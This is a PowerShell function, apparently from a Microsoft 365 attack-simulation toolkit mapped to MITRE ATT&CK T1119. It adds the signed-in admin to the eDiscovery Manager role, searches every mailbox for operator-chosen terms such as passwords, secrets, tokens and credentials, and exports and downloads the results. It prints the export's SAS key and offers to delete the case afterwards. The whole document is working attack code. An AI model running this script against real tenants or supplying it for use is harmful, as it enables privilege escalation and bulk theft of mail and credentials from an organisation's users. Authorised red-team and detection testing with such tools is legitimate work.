function AutomatedContentSearch {

    $attack_desc = "Tactic: Collection `nTechnique: Automated Collection `nDescription: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. `nMore Info: https://attack.mitre.org/techniques/T1119/"
    mitre_details($attack_desc)


    Write-Host "`nInitiate eDiscovery to find sensitive content..."

    $case_name = Read-Host -Prompt "Enter a name for your E-Discovery case"
    $description = "$case_name"
    $search_name = $case_name+"-custom_search"
    $export_location = ".\Outputs\"
    
    #Query to use for eDiscovery
    Write-Host "Example: Legal or pass* or secret or CEO or credentials or token or password"
    $searchQry = Read-Host -Prompt "Enter a term or multiple search terms separeted by 'or' for e-discovery search"
    Write-Host "`nSearch for terms: $searchQry"
    Start-Sleep -Seconds 3
    
    ###This unified export tool installer module is thanks to Dale O'Grady's script for attack lab and is essentially a copy of that###
    ##Check if microsoft.office.client.discovery.unifiedexporttool.exe tool is already installed. Install it otherwise
    While (-Not ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)){
        Write-Host "Downloading Unified Export Tool ."
        Write-Host "This is installed per-user by the Click-Once installer."

        # Credit to Jos Verlinde for his code in Load-ExchangeMFA in the Powershell Gallery!
        # https://www.powershellgallery.com/packages/Load-ExchangeMFA/1.2

        $Manifest = "https://complianceclientsdf.blob.core.windows.net/v16/Microsoft.Office.Client.Discovery.UnifiedExportTool.application"
        $ElevatePermissions = $true
        Try {
            Add-Type -AssemblyName System.Deployment
            Write-Host "Starting installation of ClickOnce Application $Manifest "
            $RemoteURI = [URI]::New( $Manifest , [UriKind]::Absolute)
            if (-not  $Manifest){
                throw "Invalid ConnectionUri parameter '$ConnectionUri'"
            }
            $HostingManager = New-Object System.Deployment.Application.InPlaceHostingManager -ArgumentList $RemoteURI , $False
            Register-ObjectEvent -InputObject $HostingManager -EventName GetManifestCompleted -Action { 
                new-event -SourceIdentifier "ManifestDownloadComplete"
            } | Out-Null
            Register-ObjectEvent -InputObject $HostingManager -EventName DownloadApplicationCompleted -Action { 
                new-event -SourceIdentifier "DownloadApplicationCompleted"
            } | Out-Null
            $HostingManager.GetManifestAsync()
            $event = Wait-Event -SourceIdentifier "ManifestDownloadComplete" -Timeout 15
            if ($event ) {
                $event | Remove-Event
                Write-Host "ClickOnce Manifest Download Completed"
                $HostingManager.AssertApplicationRequirements($ElevatePermissions)
                $HostingManager.DownloadApplicationAsync()
                $event = Wait-Event -SourceIdentifier "DownloadApplicationCompleted" -Timeout 60
                if ($event ) {
                    $event | Remove-Event
                    Write-Host "ClickOnce Application Download Completed"
                }
                else {
                    Write-error "ClickOnce Application Download did not complete in time (60s)"
                }
            }
            else {
                Write-error "ClickOnce Manifest Download did not complete in time (15s)"
            }
        }
        finally {
            Get-EventSubscriber|? {$_.SourceObject.ToString() -eq 'System.Deployment.Application.InPlaceHostingManager'} | Unregister-Event
        }
    }
    
    $export_tool = ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)
    
    ##Check if account has required roles
    $role_members = Get-RoleGroupMember "eDiscovery Manager"
    #(Get-AzureADUser -ObjectId $AdminUsername).DisplayName
    
    if ((Get-AzureADUser -ObjectId $AdminUsername).DisplayName -in $role_members.Name){
        #Do nothing
    }
    else {
        ##Escalate privileges to eDiscovery
        try {
            ##Create PSsession
            $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection 
            Import-PSSession $Comp_Session -AllowClobber

            Write-Host "`nAttempting to escalate privileges to eDiscovery Manager role ..." -ForegroundColor Gray
            Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $global:AdminUsername -ErrorAction Stop
            #Add-eDiscoveryCaseAdmin -User $global:AdminUsername
            Write-Host "`nSuccessfully elevated privileges to eDiscovery Manager role!"
            Write-Host "Waiting for changes to take effect."
            Start-Sleep -Seconds 30
        }
        catch {
            Write-Host "Error: Failed to elevate privileges to eDiscovery Manager"
            break
        }
    }

    ##Create new PSSession
    $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection
    Start-Sleep -Seconds 5
    Import-PSSession $Comp_Session -AllowClobber -DisableNameChecking
    
    ##  Create case
    Write-Host "`nCreating new compliance case: $case_name ..."
    New-ComplianceCase -Name $case_name -Description $description
    
    ##  Initiate Search query
    $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -ExchangeLocation all -ContentMatchQuery $searchQry
    
    ##  Start Actual search
    Write-Host "`nInitiating search..."
    Start-ComplianceSearch -Identity $search_name
    do
        {
            Start-Sleep -s 5
            $complianceSearch = Get-ComplianceSearch -Identity $search_name
        }
    while ($complianceSearch.Status -ne 'Completed')
    Write-Host "Compliance Search completed!!!" -ForegroundColor Yellow -BackgroundColor Black
    
    Get-ComplianceSearch -Identity $search_name | fl
 
    ##Exporting    
    Write-Host "Starting Export..."
    try {
        ##Create Compliance Search in exportable format
        Write-Host "`Building results in exportable format..."
        New-ComplianceSearchAction -SearchName $search_name -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -ErrorAction Stop
        $export_allow = $true
    }
    catch {
        Write-Error "Error: Unexpected error. Failed to export. E-Discovery module will now exit!"
    }

    if ($export_allow -eq $true) {
        # Microsoft automatically adds the _Export sufix to all exports.
        Write-Host "`nExporting search data ..."
        $export_name = $search_name + "_Export"
        
        #Wait for Export to complete
        do
            {
                Start-Sleep -s 5
                $complete = Get-ComplianceSearchAction -Identity $export_name
                #Write-Host "Progress:" $complete.JobProgress "%"
                Write-Host "Exporting..."
            }
        while ($complete.Status -ne 'Completed')
        
        Write-Host "`nExport completed" -ForegroundColor Yellow -BackgroundColor Black
        
        $export_details = Get-ComplianceSearchAction -Case $case_name -Identity $export_name -IncludeCredential -Details
        
        ##Export Details
        $export_details = $export_details.Results.split(";")
        $container_url = $export_details[0].trimStart("Container url: ")
        $sas_token = $export_details[1].trimStart(" SAS token: ")
        
        Write-Host "Download URL:" $container_url
        Write-Host "Download Key:" $sas_token
        
        #Download the exported file from M365
        Write-Host "`nInitiating download of export ..."
        Write-Host "Saving export to: " + $export_location
        
        #Start-Process -FilePath $export_tool -ArgumentList $Arguments
        & $export_tool -name $export_name -source $container_url -key $sas_token -dest $export_location -trace true
        
        Write-Host "Download completed!!!"

        $allow_undo = $true
        
        #Undo changes
        if ($allow_undo -eq $true) {
            $cleanup = Read-Host -Prompt "`nWould you like to remove the E-discovery search created (Yes/No)"

            if ($cleanup -notin "No","no","N","n"){

                try {
                    #Deleting case
                    Write-Host "Deleting case"
                    Remove-ComplianceCase -Identity $case_name -Confirm:$false
                    Write-Host "`Undo successful: Removed E-discovery case: $case_name`n" -ForegroundColor Yellow -BackgroundColor Black
                }
                catch {
                    Write-Host "Error: Failed to delete E-discovery case $case_name!`n You can try to delete it manually from the Admin console."
                }
            }
            else {
                #DoNothing
            }
        }
        Pause
    }
}